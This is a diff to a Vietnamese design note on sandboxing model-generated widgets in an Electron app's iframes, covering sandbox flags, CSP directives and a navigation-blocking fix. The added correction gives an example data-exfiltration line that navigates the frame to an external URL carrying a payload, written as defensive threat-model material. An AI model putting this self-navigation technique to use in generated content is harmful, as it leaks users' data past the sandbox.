@@ -84,7 +84,13 @@ Không giới hạn ở SVG tĩnh. Lý do: giá trị của widget nằm ở b�
 3. **Script TẮT mặc định.** Giá trị `sandbox` mặc định là **chuỗi rỗng** = bật mọi hạn chế. Người dùng bấm "Bật tương tác" thì mới thành `allow-scripts`. Đây là **trình duyệt cưỡng chế**, không phải heuristic quét markup tìm `<script>` (heuristic kiểu đó luôn thua). Đổi `sandbox` bắt buộc tạo lại frame → dùng `:key`.
 4. **CSP nhúng đầu tài liệu:**
    `default-src 'none'; style-src 'unsafe-inline'; img-src data:; media-src data:; font-src data:; form-action 'none'; base-uri 'none'` (+ `script-src 'unsafe-inline'` chỉ khi đã opt-in, ngược lại `script-src 'none'`).
-   `default-src 'none'` là directive gánh chính: chặn `fetch`/XHR/WebSocket/`sendBeacon`/ảnh ngoài/CSS-CDN/font ngoài ⇒ **không có kênh exfiltrate**, kể cả khi người dùng đã bật script. Nhiều policy CSP chỉ **giao nhau**, nên markup tự mang `<meta csp>` của nó không thể nới lỏng policy của ta.
+   `default-src 'none'` là directive gánh chính: chặn `fetch`/XHR/WebSocket/`sendBeacon`/ảnh ngoài/CSS-CDN/font ngoài; `webrtc 'block'` đóng nốt đường STUN/TURN. Nhiều policy CSP chỉ **giao nhau**, nên markup tự mang `<meta csp>` của nó không thể nới lỏng policy của ta.
+
+   **Đính chính (2026-09-08).** Câu trước đây ở đây viết *"không có kênh exfiltrate, kể cả khi người dùng đã bật script"* — **sai**, và một khẳng định an toàn sai là thứ người review dựa vào. CSP **không** có directive nào cai quản việc một document **tự điều hướng chính nó**: `navigate-to` chưa từng ship ở trình duyệt nào, và `form-action` chỉ chặn `<form>`. Với script đã bật, `location.href = 'https://…?d=' + payload` là một kênh xuất thật.
+
+   Nó bị chặn ở **tầng khác**: `will-frame-navigate` trong [`electron/src/window.ts`](../../apps/desktop/electron/src/window.ts) từ chối mọi điều hướng khung con ra ngoài `app://`/`media://`, và **không** gọi `shell.openExternal` như nhánh khung chính — mở trình duyệt thật của người dùng bằng URL do model dựng chính là thứ cần chặn. Cửa sổ chính trước đó chỉ đăng ký `will-navigate`, mà từ Electron 25 sự kiện đó **không phát cho khung con**; đây là cùng khoảng trống với gói browser tool và đã vá ở cả hai nơi.
+
+   Nút "Xem toàn màn hình" gửi bản **không script** sang `PreviewModal`, vì khung của modal mang `allow-popups`.
 5. **Ngân sách:** cap 256 KB (vượt ⇒ chỉ hiện source), chiều cao cố định 3 nấc 260/440/720px, lazy-mount qua `IntersectionObserver` (frame chỉ được tạo khi cuộn tới).
 
 ### 3.3 Rủi ro còn lại (ghi rõ, không giấu)
